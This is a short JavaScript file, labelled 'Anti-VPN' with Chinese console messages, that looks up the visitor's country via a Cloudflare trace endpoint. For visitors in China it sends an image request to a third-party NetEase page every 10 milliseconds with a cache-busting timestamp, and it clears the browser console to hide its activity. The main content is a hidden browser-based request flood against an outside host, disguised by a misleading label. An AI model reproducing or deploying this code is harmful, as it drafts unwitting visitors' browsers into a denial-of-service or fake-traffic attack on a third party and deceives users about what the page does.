setTimeout(function () {
    console.clear()
}, 10000);

var xml = new XMLHttpRequest();
xml.onreadystatechange = function () {
  if (xml.readyState == 0) {
    console.log("[Anti-VPN]请求未初始化");
  }
  if (xml.readyState == 1) {
    console.log("[Anti-VPN]服务器连接已建立");
  }
  if (xml.readyState == 2) {
    console.log("[Anti-VPN]请求已接收");
  }
  if (xml.readyState == 3) {
    console.log("[Anti-VPN]请求处理中");
  }
  if (xml.readyState == 4) {
    console.log("[Anti-VPN]请求已完成,且响应已就绪");
  }
};
xml.open("GET", "https://cdn.cyfan.top/cdn-cgi/trace", false);
xml.send();
var loc = xml.responseText.split("loc=")[1].split("\n")[0];
console.info(loc);
if (loc && loc === "CN") {
  function imgflood() {
    var TARGET =
      "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
    var pic = new Image();
    pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
  }
  setTimeout(function () {
    setInterval(imgflood, 10);
  }, 5000);
}
